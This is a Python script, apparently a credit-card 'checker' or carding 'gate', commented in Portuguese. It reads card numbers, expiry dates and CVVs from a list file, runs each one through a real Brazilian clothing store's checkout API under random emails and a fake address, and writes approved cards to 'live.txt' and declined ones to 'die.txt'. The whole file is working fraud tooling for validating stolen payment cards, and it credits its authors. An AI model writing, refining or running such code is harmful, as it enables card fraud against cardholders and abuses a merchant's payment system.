import re
import random
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Desativa os avisos de SSL
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def multiexplode(delimiters, string):
    regex_pattern = '|'.join(map(re.escape, delimiters))
    return re.split(regex_pattern, string)

def get_str(string, start, end):
    return string.split(start)[1].split(end)[0]

def generate_random_email(length=8):
    characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    email = ''.join(random.choice(characters) for _ in range(length))
    return email

def puxar(separa, inicia, fim, contador):
    return separa.split(inicia)[contador].split(fim)[0]

# Corrige o ano, se necessário
def corrigir_ano(ano):
    anos_corretos = {
        '2024': '24', '2025': '25', '2026': '26', '2027': '27',
        '2028': '28', '2029': '29', '2030': '30', '2031': '31',
        '2032': '32', '2033': '33', '2034': '34', '2035': '35'
    }
    return anos_corretos.get(ano, ano)

# Criação de uma sessão
session = requests.Session()

# Headers padrão para as requisições
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    'Content-Type': 'application/json; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
}

# Ler o arquivo linha por linha
with open('lista.txt', 'r') as file:
    for line in file:
        line = line.strip()
        if not line:
            continue

        # Extrai as informações da linha
        cc, mes, ano, cvv = multiexplode(['|'], line)

        # Corrige o ano, se necessário
        ano = corrigir_ano(ano)

        # Geração de e-mail aleatório
        random_email = generate_random_email()

        # Primeira requisição
        response = session.get(
            'https://loja.solo.ind.br/jaqueta-solo-microfleece-iii-masculina-chinois-green/p',
            headers=headers,
            verify=False
        )

        # Segunda requisição
        data = '{"expectedOrderFormSections":["items","paymentData","totalizers","shippingData","sellers"]}'
        response = session.post(
            'https://loja.solo.ind.br/api/checkout/pub/orderForm?refreshOutdatedData=true',
            headers=headers,
            data=data,
            verify=False
        )

        orderformid = puxar(response.text, '"orderFormId":"','"' , 1)

        # Terceira requisição
        data = '{"orderItems":[{"id":6423,"quantity":1,"seller":"1"}],"expectedOrderFormSections":["items","totalizers","clientProfileData","shippingData","paymentData","sellers","messages","marketingData","clientPreferencesData","storePreferencesData","giftRegistryData","ratesAndBenefitsData","openTextField","commercialConditionData","customData"]}'
        response = session.post(
            f'https://loja.solo.ind.br/api/checkout/pub/orderForm/{orderformid}/items?sc=1',
            headers=headers,
            data=data,
            verify=False
        )

        # Quarta requisição
        data = f'{{"email":"{random_email}@gmail.com"}}'
        response = session.post(
            f'https://loja.solo.ind.br/api/checkout/pub/orderForm/{orderformid}/attachments/clientProfileData',
            headers=headers,
            data=data,
            verify=False
        )

        # Quinta requisição
        data = '{"addressType":"residential","receiverName":"Joao Silva","address":{"street":"Rua Falsa","state":"SP","city":"Sao Paulo","neighborhood":"Centro","postalCode":"01000-000","country":"BRA"},"selectedSla":"normal"}'
        response = session.post(
            f'https://loja.solo.ind.br/api/checkout/pub/orderForm/{orderformid}/attachments/shippingData',
            headers=headers,
            data=data,
            verify=False
        )

        # Sexta requisição
        data = f'{{"reference":"{cc}","cvv":"{cvv}","expiresMonth":"{mes}","expiresYear":"{ano}","billingAddress":{{"street":"Rua Falsa","state":"SP","city":"Sao Paulo","neighborhood":"Centro","postalCode":"01000-000","country":"BRA"}}}}'
        response = session.post(
            f'https://loja.solo.ind.br/api/checkout/pub/orderForm/{orderformid}/payments',
            headers=headers,
            data=data,
            verify=False
        )

        # Verifica a resposta da última requisição
        resp = response.text
        if 'ReturnCode:N7' in resp:
            retorno = f'Aprovada - {line} - {resp}@pugno_yt & @duckettstone'
            print(retorno)
            with open('live.txt', 'a') as file:
                file.write(retorno + '\n')
        elif 'Seu pagamento não foi autorizado. Houve algum problema na autorização do pagamento.' in resp:
            retorno = f'Reprovada - {line} - Seu pagamento não foi autorizado. Houve algum problema na autorização do pagamento. - @pugno_yt & @duckettstone'
            print(retorno)
            with open('die.txt', 'a') as file:
                file.write(retorno + '\n')
        else:
            retorno = f'Reprovada - {line} - {resp} @pugno_yt & @duckettstone'
            print(retorno)
            with open('die.txt', 'a') as file:
                file.write(retorno + '\n')

print('Agradeça PladixOficial pela gate.')
